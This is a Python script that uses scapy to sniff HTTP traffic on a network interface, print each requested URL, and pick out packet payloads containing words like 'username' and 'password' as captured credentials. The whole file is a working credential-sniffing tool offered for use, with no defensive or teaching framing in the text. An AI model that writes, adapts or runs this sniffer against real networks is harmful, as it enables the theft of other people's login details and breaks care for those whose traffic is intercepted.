#!/usr/bin/env python
import optparse

import scapy.all as scapy
from scapy.layers import http


def getInput():
    parser = optparse.OptionParser(usage="Usage: packet_sniffer [-iface] [interfaceName]\n"
                                         "Usage Example:\t packet_sniffer -i eth0")
    parser.add_option("-i", "--iface", dest="iface", help="Specify interface ")
    return parser.parse_args()[0]


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  # prn field has function where the packet
    # is to transferred


def get_url(packet):
    # capturing URLs
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_login_info(packet):
    # capturing login details
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "password", "pass", "login"]
        for element in keywords:
            if element in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # getting url
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        # getting login info
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


options = getInput()
if not options.iface:
    print("[-] Specify interface name")
else:
    try:
        sniff(options.iface)
    except KeyboardInterrupt:
        print("[+] Quitting")
